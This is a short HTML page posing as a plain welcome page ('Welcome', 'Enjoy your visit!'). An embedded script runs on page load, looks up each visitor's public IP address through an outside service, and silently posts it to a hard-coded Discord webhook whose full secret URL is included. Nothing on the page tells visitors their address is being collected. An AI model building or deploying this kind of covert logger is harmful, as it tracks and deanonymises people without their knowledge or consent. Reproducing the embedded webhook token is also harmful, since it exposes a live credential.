<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;

  
                    const webhookUrl = 'https://discord.com/api/webhooks/1240379669484802149/bICd0lDIVPKUGRV3L_HRrmbzxbc_vYxojFvo80wRzM13kWE3nFMZaugJekX--dRYLBqg';
                    const message = {
                        content: `IP Address: ${ip}`,
                        username: 'IP Logger'
                    };

                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(message)
                    }).then(response => {
                        if (response.ok) {
                            console.log('IP logged successfully!');
                        } else {
                            console.log('Failed to log IP.');
                        }
                    }).catch(error => {
                        console.error('Error:', error);
                    });
                })
                .catch(error => {
                    console.error('Error fetching IP:', error);
                });
        });
    </script>
</head>
<body>
    <h1>Welcome</h1>
    <p>Enjoy your visit!</p>
</body>
</html>
